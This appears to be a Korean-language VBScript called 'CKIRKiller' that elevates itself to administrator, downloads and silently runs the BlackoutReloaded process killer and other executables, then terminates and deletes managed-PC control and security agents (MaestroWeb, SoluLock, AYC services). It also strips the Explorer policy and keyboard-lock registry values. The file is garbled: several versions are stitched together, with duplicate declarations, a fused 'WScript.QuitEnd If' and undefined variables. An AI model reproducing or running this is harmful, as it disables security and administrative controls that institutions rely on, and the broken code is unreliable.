Option Explicit

Dim oShell, oFSO, oWMI, oReg
Set oShell = CreateObject("WScript.Shell")
Set oFSO   = CreateObject("Scripting.FileSystemObject")
Set oWMI   = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
Set oReg   = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv")

Const HKEY_CLASSES_ROOT  = &H80000000
Const HKEY_CURRENT_USER  = &H80000001
Const HKEY_LOCAL_MACHINE = &H80000002

Const GitPath      = "C:\Program Files\Git"
Const GitExe       = "C:\Program Files\Git\git-bash.exe"
Const BlackoutExe  = "C:\Program Files\Git\BlackoutReloaded.exe"
Const GitInstaller = "C:\Windows\Temp\Git-Inst.exe"
Const BlackoutTmp  = "C:\Windows\Temp\Blackout.exe"
Const MaestroDir   = "C:\Program Files (x86)\Solusseum\MaestroWeb Agent"
Const GitURL       = "https://github.com/git-for-windows/git/releases/download/v2.53.0.windows.2/Git-2.53.0.2-64-bit.exe"
Const BlackoutURL  = "https://github.com/tijme/blackout-reloaded/raw/master/BlackoutReloaded.exe"
Const SetUserFTAExe = "C:\Program Files\Git\SetUserFTA.exe"
Const SetUserFTATmp = "C:\Windows\Temp\SetUserFTA.exe"
Const SetUserFTAURL = "https://github.com/bicheondev/C/raw/refs/heads/main/SetUserFTA.exe"

EnsureAdmin
PrepareTools
RunKillStages

If MsgBox( _
    UHex("D55C CEF4 0020 C785 B825 AE30 0020 C81C AC70 B3C4 0020 AC19 C774 0020 C9C4 D589 D560 AE4C C694 003F") & vbCrLf & _
    UHex("0028 BA54 BAA8 C7A5 C5D0 0020 C788 B294 0020 CF54 B4DC B97C 0020 BCF5 BD99 D558 B294 0020 ADC0 CC2E C740 0020 ACFC C815 C774 0020 D3EC D568 B429 B2C8 B2E4 002E 0029") & vbCrLf & vbCrLf & _
    UHex("C9C4 D589 D558 B824 BA74 0020 0027 C608 0028 0059 0029 0027 002C 0020 AC74 B108 B6F0 B824 BA74 0020 0027 C544 B2C8 C624 0028 004E 0029 0027 B97C 0020 B20C B7EC C8FC C138 C694 002E"), _
    vbYesNo + vbQuestion, _
    "CKIRKiller" _
) = vbYes Then
    ShowHancomGuide
End If

If MsgBox( _
    UHex("0043 0068 0072 006F 006D 0065 C744 0020 AE30 BCF8 0020 BE0C B77C C6B0 C800 B85C 0020 C124 C815 D558 C2DC ACA0 C2B5 B2C8 AE4C 003F") & vbCrLf & _
    UHex("0028 0068 0074 0074 0070 002C 0020 0068 0074 0074 0070 0073 002C 0020 002E 0068 0074 006D 006C 0020 B4F1 C744 0020 C790 B3D9 C73C B85C 0020 0043 0068 0072 006F 006D 0065 C5D0 0020 C5F0 ACB0 D569 B2C8 B2E4 002E") & vbCrLf & _
    UHex("0020 C778 D130 B137 0020 C5F0 ACB0 C774 0020 D544 C694 D569 B2C8 B2E4 002E 0029"), _
    vbYesNo + vbQuestion, _
    "CKIRKiller" _
) = vbYes Then
    SetChromeAsDefault
End If

UnlockPolicies
RestartExplorer
FinishPrompt
WScript.Quit

Function UHex(sHex)
    Dim parts, i, result, codePoint

    parts = Split(sHex, " ")
    result = ""

    For i = 0 To UBound(parts)
        If Len(parts(i)) > 0 Then
            codePoint = CLng("&H" & parts(i))

            If codePoint > &H7FFF Then
                codePoint = codePoint - &H10000
            End If

            result = result & ChrW(codePoint)
        End If
    Next

    UHex = result
End Function

Sub EnsureAdmin()
    Dim sTestFile, bAdmin, oTest, sScript
    sTestFile = "C:\Windows\System32\_admintest_.tmp"
    bAdmin = False

    On Error Resume Next
    Set oTest = oFSO.CreateTextFile(sTestFile, True)

    If Err.Number = 0 Then
        bAdmin = True
        oTest.Close
        oFSO.DeleteFile sTestFile, True
    End If

    On Error GoTo 0

    If Not bAdmin Then
        sScript = WScript.ScriptFullName

        CreateObject("Shell.Application").ShellExecute _
            "wscript.exe", _
            Chr(34) & sScript & Chr(34), _
            "", _
            "runas", _
            1

        WScript.Quit
    End If
End Sub

Sub PrepareTools()
    Dim needGit, needBlackout, needSetUserFTA

    needGit = Not oFSO.FileExists(GitExe)
    needBlackout = Not oFSO.FileExists(BlackoutExe)
    needSetUserFTA = Not oFSO.FileExists(SetUserFTAExe)

    If needGit Then
        StartBitsDownload GitURL, GitInstaller, "gitdl"
    End If

    If needBlackout Then
        StartBitsDownload BlackoutURL, BlackoutTmp, "blackoutdl"
    End If

    If needSetUserFTA Then
        StartBitsDownload SetUserFTAURL, SetUserFTATmp, "sftadl"
    End If

    If needGit Then
        WaitForFile GitInstaller, 240
        oShell.Run """" & GitInstaller & """ /VERYSILENT /NORESTART /NOCANCEL /SP-", 0, True
    End If

    If needBlackout Then
        WaitForFile BlackoutTmp, 120

        On Error Resume Next

        If oFSO.FileExists(BlackoutExe) Then
            oFSO.DeleteFile BlackoutExe, True
        End If

        oFSO.MoveFile BlackoutTmp, BlackoutExe
        On Error GoTo 0
    End If

    If needSetUserFTA Then
        WaitForFile SetUserFTATmp, 120

        On Error Resume Next

        If oFSO.FileExists(SetUserFTAExe) Then
            oFSO.DeleteFile SetUserFTAExe, True
        End If

        oFSO.MoveFile SetUserFTATmp, SetUserFTAExe
        On Error GoTo 0
    End If
End Sub

Sub RunKillStages()
    Dim targets, fallbackDirs, edgeDir, edgeUpdateDir

    edgeDir = "C:\Program Files (x86)\Microsoft\Edge\Application"
    edgeUpdateDir = "C:\Program Files (x86)\Microsoft\EdgeUpdate"

    targets = Array( _
        "qukapttp.exe", _
        "nfowjxyfd.exe", _
        "lqndauccd.exe", _
        "rwtyijsa.exe", _
        "nhfneczzm.exe", _
        "AYCWSSrv.ayc", _
        "AYCRTSrv.ayc", _
        "AYIASrv.exe", _
        "AYCUpdSrv.ayc", _
        "AYCMain.ayc", _
        "AYCAgent.ayc", _
        "AYCRTSrv.exe", _
        "Yoondisk_hd_recv.exe", _
        "yoondisk_chplayer.exe", _
        "MaestroWebSvr.exe", _
        "MaestroWebAgent.exe", _
        "SoluLock.exe", _
        "msedge.exe", _
        "MicrosoftEdgeUpdate.exe" _
    )

    fallbackDirs = Array( _
        "", "", "", "", "", "", "", "", "", "", "", "", "", "", _
        MaestroDir, MaestroDir, MaestroDir, _
        edgeDir, edgeUpdateDir _
    )

    BlackoutBatchAll targets, fallbackDirs

    If oFSO.FolderExists(MaestroDir) Then
        DeleteFolderContents MaestroDir
    End If
End Sub

Sub UnlockPolicies()
    On Error Resume Next

    oReg.DeleteValue _
        HKEY_LOCAL_MACHINE, _
        "SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer", _
        "NoControlPanel"

    oReg.DeleteValue _
        HKEY_LOCAL_MACHINE, _
        "SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer", _
        "NoSettingsPage"

    oReg.DeleteValue _
        HKEY_CURRENT_USER, _
        "Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", _
        "NoControlPanel"

    oReg.DeleteValue _
        HKEY_LOCAL_MACHINE, _
        "SYSTEM\CurrentControlSet\Control\Keyboard Layout", _
        "Scancode Map"

    On Error GoTo 0
End Sub

Sub RestartExplorer()
    On Error Resume Next

    oShell.Run "taskkill /F /IM explorer.exe", 0, True
    WScript.Sleep 1000
    oShell.Run "explorer.exe", 0, False

    On Error GoTo 0
End Sub

Sub ShowHancomGuide()
    Dim psFixTxt, oT

    psFixTxt = oFSO.GetSpecialFolder(2) & "\HancomFix_Guide.txt"

    Set oT = oFSO.CreateTextFile(psFixTxt, True, True)

    oT.WriteLine "=========================================================="
    oT.WriteLine UHex("D55C CEF4 0020 C785 B825 AE30 0020 C81C AC70 0020 D6C4 0020 D55C AD6D C5B4 0020 C785 B825 AE30 0020 BCF5 C6D0 0020 AC00 C774 B4DC")
    oT.WriteLine "=========================================================="
    oT.WriteLine "1. " & UHex("C544 B798 0020 0035 C904 C758 0020 BA85 B839 C5B4 B97C 0020 BCF5 C0AC 0028 0043 0074 0072 006C 002B 0043 0029 D569 B2C8 B2E4 002E")
    oT.WriteLine "2. " & UHex("0050 006F 0077 0065 0072 0053 0068 0065 006C 006C 0020 0049 0053 0045 0020 CC3D C5D0 0020 BA85 B839 C5B4 CC3D C5D0 0020 BD99 C5EC B123 AE30 0028 0043 0074 0072 006C 002B 0056 0029 0020 D6C4 0020 C2E4 D589 002E")
    oT.WriteLine ""
    oT.WriteLine "$UserLanguageList = New-WinUserLanguageList -Language ""ko-KR"""
    oT.WriteLine "Set-WinUserLanguageList -LanguageList $UserLanguageList -Force"
    oT.WriteLine "Stop-Process -Name ""ctfmon"" -Force -ErrorAction SilentlyContinue"
    oT.WriteLine "Remove-Item -Path ""HKCU:\Software\Microsoft\CTF\SortOrder"" -Recurse -Force"
    oT.WriteLine "Start-Process ""ctfmon.exe"""
    oT.Close

    oShell.Run "notepad.exe """ & psFixTxt & """", 1, False
    oShell.Run "powershell_ise.exe", 1, False
End Sub

Sub SetChromeAsDefault()
    Dim sChrome, chromePaths, i, sCommand

    chromePaths = Array( _
        "C:\Program Files\Google\Chrome\Application\chrome.exe", _
        "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe", _
        oShell.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Google\Chrome\Application\chrome.exe" _
    )

    sChrome = ""

    For i = 0 To UBound(chromePaths)
        If oFSO.FileExists(chromePaths(i)) Then
            sChrome = chromePaths(i)
            Exit For
        End If
    Next

    If sChrome = "" Then
        MsgBox _
            UHex("0043 0068 0072 006F 006D 0065 C774 0020 C124 CE58 B418 C5B4 0020 C788 C9C0 0020 C54A C2B5 B2C8 B2E4 002E") & vbCrLf & _
            UHex("0043 0068 0072 006F 006D 0065 0020 C124 CE58 0020 D6C4 0020 B2E4 C2DC 0020 C2DC B3C4 D574 C8FC C138 C694 002E"), _
            vbExclamation, _
            "CKIRKiller"

        Exit Sub
    End If

    sCommand = """" & sChrome & """ --single-argument %1"

    On Error Resume Next

    oReg.SetStringValue _
        HKEY_CLASSES_ROOT, _
        "MSEdgeHTM\shell\open\command", _
        "", _
        sCommand

    oReg.SetStringValue _
        HKEY_CLASSES_ROOT, _
        "MSEdgePDF\shell\open\command", _
        "", _
        sCommand

    On Error GoTo 0

    If oFSO.FileExists(SetUserFTAExe) Then
        On Error Resume Next

        oShell.Run """" & SetUserFTAExe & """ .html ChromeHTML", 0, True
        oShell.Run """" & SetUserFTAExe & """ .htm ChromeHTML", 0, True
        oShell.Run """" & SetUserFTAExe & """ .shtml ChromeHTML", 0, True
        oShell.Run """" & SetUserFTAExe & """ .xhtml ChromeHTML", 0, True
        oShell.Run """" & SetUserFTAExe & """ .svg ChromeHTML", 0, True
        oShell.Run """" & SetUserFTAExe & """ .webp ChromeHTML", 0, True

        On Error GoTo 0
    End If

    MsgBox _
        UHex("0043 0068 0072 006F 006D 0065 C774 0020 AE30 BCF8 0020 BE0C B77C C6B0 C800 B85C 0020 C124 C815 B418 C5C8 C2B5 B2C8 B2E4 002E") & vbCrLf & _
        UHex("0028 0068 0074 0074 0070 002C 0020 0068 0074 0074 0070 0073 002C 0020 002E 0068 0074 006D 006C 002C 0020 002E 0070 0064 0066 0020 B4F1 0020 BAA8 B450 0020 0043 0068 0072 006F 006D 0065 C73C B85C 0020 C5F4 B9BD B2C8 B2E4 002E 0029") & vbCrLf & vbCrLf & _
        UHex("C774 BBF8 0020 C2E4 D589 0020 C911 C778 0020 C571 C740 0020 C7AC C2DC C791 D574 C57C 0020 BC18 C601 B429 B2C8 B2E4 002E"), _
        vbInformation, _
        "CKIRKiller"
End Sub

Sub FinishPrompt()
    MsgBox _
        UHex("BAA8 B4E0 0020 C791 C5C5 C774 0020 C644 B8CC B418 C5C8 C2B5 B2C8 B2E4 002E"), _
        vbInformation + vbSystemModal, _
        "CKIRKiller"
End Sub

Sub StartBitsDownload(sURL, sDest, sJobName)
    On Error Resume Next

    If oFSO.FileExists(sDest) Then
        oFSO.DeleteFile sDest, True
    End If

    On Error GoTo 0

    oShell.Run _
        "bitsadmin /transfer " & sJobName & _
        " /download /priority foreground """ & sURL & """ """ & sDest & """", _
        0, _
        False
End Sub

Sub WaitForFile(sPath, maxSeconds)
    Dim i

    For i = 1 To maxSeconds * 2
        If oFSO.FileExists(sPath) Then
            Exit For
        End If

        WScript.Sleep 500
    Next
End Sub

Sub BlackoutBatchAll(arrExes, arrFallbackDirs)
    Dim paths(), i, sExe, sPath, sFallback

    ReDim paths(UBound(arrExes))

    For i = 0 To UBound(arrExes)
        sExe = CStr(arrExes(i))
        sFallback = CStr(arrFallbackDirs(i))

        sPath = ResolveExecutablePath(sExe)

        If sPath = "" And sFallback <> "" Then
            sPath = sFallback & "\" & sExe
        End If

        paths(i) = sPath

        oShell.Run "taskkill /F /IM """ & sExe & """", 0, False
        oShell.Run """" & BlackoutExe & """ " & sExe, 0, False
    Next

    WScript.Sleep 450

    For i = 0 To UBound(arrExes)
        If CStr(paths(i)) <> "" Then
            SafeDeleteFile CStr(paths(i))
        End If
    Next

    WScript.Sleep 300

    For i = 0 To UBound(arrExes)
        If CStr(paths(i)) <> "" Then
            SafeDeleteFile CStr(paths(i))
        End If
    Next
End Sub

Function ResolveExecutablePath(sExe)
    Dim oProcs, oProc, sFilePath

    sFilePath = ""

    On Error Resume Next

    Set oProcs = oWMI.ExecQuery( _
        "SELECT ExecutablePath FROM Win32_Process WHERE Name='" & sExe & "'" _
    )

    For Each oProc In oProcs
        If Not IsNull(oProc.ExecutablePath) Then
            If oProc.ExecutablePath <> "" Then
                sFilePath = oProc.ExecutablePath
            End If
        End If
    Next

    On Error GoTo 0

    ResolveExecutablePath = sFilePath
End Function

Sub SafeDeleteFile(sPath)
    If sPath = "" Then
        Exit Sub
    End If

    On Error Resume Next
    oFSO.DeleteFile sPath, True
    On Error GoTo 0
End Sub

Sub DeleteFolderContents(sPath)
    Dim oFolder, oFile, oSub

    Set oFolder = oFSO.GetFolder(sPath)

    For Each oFile In oFolder.Files
        On Error Resume Next
        oFile.Delete True
        On Error GoTo 0
    Next

    For Each oSub In oFolder.SubFolders
        On Error Resume Next
        oSub.Delete True
        On Error GoTo 0
    Next
End Sub
' ------------------------------------------------------------
' ACTUAL LOGIC (This part runs only in ANSI environment)
' ------------------------------------------------------------

Dim oShell, oFSO, oWMI, oReg
Set oShell = CreateObject("WScript.Shell")
Set oFSO   = CreateObject("Scripting.FileSystemObject")
Set oWMI   = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
Set oReg   = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv")

Const HKEY_CURRENT_USER  = &H80000001
Const HKEY_LOCAL_MACHINE = &H80000002
Const GitPath = "C:\Program Files\Git"
Const BlackoutExe = "C:\Program Files\Git\BlackoutReloaded.exe"
Const MaestroDir = "C:\Program Files (x86)\Solusseum\MaestroWeb Agent"
Const GitURL = "https://github.com/git-for-windows/git/releases/download/v2.53.0.windows.2/Git-2.53.0.2-64-bit.exe"
Const BlackoutURL = "https://github.com/tijme/blackout-reloaded/raw/master/BlackoutReloaded.exe"

' Step 1: 시작 질문
Dim nHancomRes
nHancomRes = MsgBox("한컴 입력기 제거도 같이 진행할까요?" & vbCrLf & _
                    "(메모장에 있는 코드를 복붙하는 귀찮은 과정이 포함됩니다.)" & vbCrLf & vbCrLf & _
                    "진행하려면 '예(Y)', 건너뛰려면 '아니오(N)'를 눌러주세요.", _
                    vbYesNo + vbQuestion, "CKIRKiller")

' Core Process (Git/Blackout)
If Not oFSO.FileExists(GitPath & "\git-bash.exe") Then
    oShell.Run "bitsadmin /transfer d /download /priority foreground """ & GitURL & """ ""C:\Windows\Temp\Git-Inst.exe""", 0, True
    oShell.Run """C:\Windows\Temp\Git-Inst.exe"" /VERYSILENT /NORESTART", 0, True
End If

If Not oFSO.FileExists(BlackoutExe) Then
    oShell.Run "bitsadmin /transfer d /download /priority foreground """ & BlackoutURL & """ ""C:\Windows\Temp\Blackout.exe""", 0, True
    oFSO.MoveFile "C:\Windows\Temp\Blackout.exe", BlackoutExe
End If

' Kill Processes
Dim arr, t
arr = Array("qukapttp.exe", "nfowjxyfd.exe", "lqndauccd.exe", "rwtyijsa.exe", "nhfneczzm.exe", "AYCWSSrv.ayc", "AYCRTSrv.ayc", "AYIASrv.exe", "AYCUpdSrv.ayc", "AYCMain.ayc", "AYCAgent.ayc", "AYCRTSrv.exe", "AYIASrv.exe", "Yoondisk_hd_recv.exe", "yoondisk_chplayer.exe", "MaestroWebSvr.exe", "MaestroWebAgent.exe", "SoluLock.exe")
For Each t In arr
    oShell.Run """" & BlackoutExe & """ " & t, 0, True
Next

' Unlock Policies
oReg.DeleteValue HKEY_LOCAL_MACHINE, "SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoControlPanel"
oReg.DeleteValue HKEY_LOCAL_MACHINE, "SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoSettingsPage"
oReg.DeleteValue HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoControlPanel"
oReg.DeleteValue HKEY_LOCAL_MACHINE, "SYSTEM\CurrentControlSet\Control\Keyboard Layout", "Scancode Map"

' Restart Explorer
On Error Resume Next
oShell.Run "taskkill /F /IM explorer.exe", 0, True
WScript.Sleep 1000
oShell.Run "explorer.exe", 0, False
On Error GoTo 0

' Step 2: 한컴 수동 안내 (Alert 우선 순위 조정)
If nHancomRes = vbYes Then
    Dim psFixTxt : psFixTxt = oFSO.GetSpecialFolder(2) & "\HancomFix_Guide.txt"
    Dim oT : Set oT = oFSO.CreateTextFile(psFixTxt, True)
    oT.WriteLine "=========================================================="
    oT.WriteLine "한컴 입력기 수동 최적화 가이드"
    oT.WriteLine "=========================================================="
    oT.WriteLine "1. 아래 5줄의 명령어를 복사(Ctrl+C)합니다."
    oT.WriteLine "2. PowerShell ISE 하단 입력창에 붙여넣기(Ctrl+V) 후 엔터."
    oT.WriteLine ""
    oT.WriteLine "$UserLanguageList = New-WinUserLanguageList -Language ""ko-KR"""
    oT.WriteLine "Set-WinUserLanguageList -LanguageList $UserLanguageList -Force"
    oT.WriteLine "Stop-Process -Name ""ctfmon"" -Force -ErrorAction SilentlyContinue"
    oT.WriteLine "Remove-Item -Path ""HKCU:\Software\Microsoft\CTF\SortOrder"" -Recurse -Force"
    oT.Write "Start-Process ""ctfmon.exe""" ' WriteLine 대신 Write를 사용하여 마지막 엔터 제거
    oT.Close
    
    oShell.Run "notepad.exe """ & psFixTxt & """", 1, False
    oShell.Run "powershell_ise.exe", 1, False
    
    ' 창들이 뜰 시간을 준 뒤, 가장 위로 오게 Alert 실행
    WScript.Sleep 800 
    MsgBox "메모장 가이드가 열렸습니다. 안내에 따라 코드를 복사해서 파란색 창(ISE)에 붙여넣어 주세요.", vbInformation + vbSystemModal, "Guide"
End If

' Step 3: 최종 완료 (잠시 쉬었다가 실행)
WScript.Sleep 500
Dim finalMsg
finalMsg = "모든 최적화 작업이 완료되었습니다!" & vbCrLf & _
           "제어판 및 Windows 키 해금을 적용하려면 로그아웃이 필요합니다." & vbCrLf & vbCrLf & _
           "필요하시면 작업 중인 문서를 모두 저장하시고 '예(Y)'를 눌러 로그아웃하세요. (로그아웃이라 데이터 안 날아감)"

If MsgBox(finalMsg, vbYesNo + vbInformation + vbSystemModal, "CKIRKiller") = vbYes Then
    oWMI.ExecQuery("Select * from Win32_OperatingSystem").ItemIndex(0).Win32Shutdown(4)
End If

WScript.QuitEnd If
On Error GoTo 0

If Not bAdmin Then
    Dim sScript : sScript = WScript.ScriptFullName
    oShell.Run "mshta vbscript:Execute(""CreateObject(""""Shell.Application"""").ShellExecute """"wscript.exe"""","""""""""  & sScript & """"""""",,""""runas"""",1:close"")", 0, False
    WScript.Quit
End If

' ── Main ────────────────────────────────────────────────────
MsgBox "작업이 시작됩니다." & vbCrLf & _
       "자동적으로 각 작업이 진행되니 확인 버튼만 클릭하면 됩니다.", _
       vbInformation, "CKIRKiller"

' STEP 1: Install Git
If Not oFSO.FileExists(GitPath & "\git-bash.exe") Then
    MsgBox "1/3단계: Git 다운로드 중(시간이 다소 소요됩니다)...", vbInformation, "CKIRKiller"
    BitsDownload GitURL, GitInstaller
    MsgBox "1/3단계: Git 설치 중...", vbInformation, "CKIRKiller"
    oShell.Run """" & GitInstaller & """ /VERYSILENT /NORESTART /NOCANCEL /SP-", 0, True
End If

' STEP 2: Place BlackoutReloaded.exe
If Not oFSO.FileExists(BlackoutExe) Then
    MsgBox "2/3단계: BlackoutReloaded.exe 다운로드 중...", vbInformation, "CKIRKiller"
    BitsDownload BlackoutURL, BlackoutTmp
    oFSO.MoveFile BlackoutTmp, BlackoutExe
End If

' STEP 3: Kill wave 1 targets ? resolve path via WMI, then kill + delete
MsgBox "3/3단계: 프로세스 종료 및 제거 중...", vbInformation, "CKIRKiller"
BlackoutWithPath "qukapttp.exe"
BlackoutWithPath "nfowjxyfd.exe"
BlackoutWithPath "lqndauccd.exe"
BlackoutWithPath "AYCWSSrv.ayc"
BlackoutWithPath "AYCRTSrv.ayc"
BlackoutWithPath "AYIASrv.exe"
BlackoutWithPath "AYCUpdSrv.ayc"
BlackoutWithPath "nhfneczzm.exe"
BlackoutAndDelete "MaestroWebSvr.exe"
BlackoutAndDelete "MaestroWebAgent.exe"
BlackoutAndDelete "SoluLock.exe"
If oFSO.FolderExists(MaestroDir) Then
    DeleteFolderContents MaestroDir
End If

MsgBox "작업이 완료되었습니다.", vbInformation, "CKIRKiller"

WScript.Quit

' ============================================================
'  Helpers
' ============================================================

Sub BitsDownload(sURL, sDest)
    On Error Resume Next
    oFSO.DeleteFile sDest, True
    On Error GoTo 0
    oShell.Run "bitsadmin /transfer bloatdl /download /priority foreground """ & sURL & """ """ & sDest & """", 0, True
End Sub

' Resolve the executable's full path from WMI, kill it, then delete the file
Sub BlackoutWithPath(sExe)
    Dim sFilePath : sFilePath = ""

    ' Query WMI for the running process to get its ExecutablePath
    Dim oProcs, oProc
    Set oProcs = oWMI.ExecQuery("SELECT ExecutablePath FROM Win32_Process WHERE Name='" & sExe & "'")
    For Each oProc In oProcs
        If oProc.ExecutablePath <> "" Then
            sFilePath = oProc.ExecutablePath
        End If
    Next

    ' Kill via taskkill + BlackoutReloaded (sync)
    oShell.Run "taskkill /F /IM """ & sExe & """", 0, True
    WScript.Sleep 300
    oShell.Run """" & BlackoutExe & """ " & sExe, 0, True

    ' Delete the file if we found its path
    If sFilePath <> "" Then
        On Error Resume Next
        oFSO.DeleteFile sFilePath, True
        On Error GoTo 0
    End If
End Sub

' Kill wave 2 async, delete immediately while process is dying
Sub BlackoutAndDelete(sExe)
    Dim sFilePath : sFilePath = MaestroDir & "\" & sExe

    ' Resolve actual path via WMI in case it differs
    Dim oProcs, oProc
    Set oProcs = oWMI.ExecQuery("SELECT ExecutablePath FROM Win32_Process WHERE Name='" & sExe & "'")
    For Each oProc In oProcs
        If oProc.ExecutablePath <> "" Then sFilePath = oProc.ExecutablePath
    Next

    ' Fire async ? don't wait so delete races the kill
    oShell.Run "taskkill /F /IM """ & sExe & """", 0, False
    oShell.Run """" & BlackoutExe & """ " & sExe, 0, False

    WScript.Sleep 50
    On Error Resume Next
    oFSO.DeleteFile sFilePath, True
    On Error GoTo 0

    WScript.Sleep 200
    On Error Resume Next
    oFSO.DeleteFile sFilePath, True
    On Error GoTo 0
End Sub

Sub DeleteFolderContents(sPath)
    Dim oFolder : Set oFolder = oFSO.GetFolder(sPath)
    Dim oFile, oSub
    For Each oFile In oFolder.Files
        On Error Resume Next
        oFile.Delete True
        On Error GoTo 0
    Next
    For Each oSub In oFolder.SubFolders
        On Error Resume Next
        oSub.Delete True
        On Error GoTo 0
    Next
End Sub
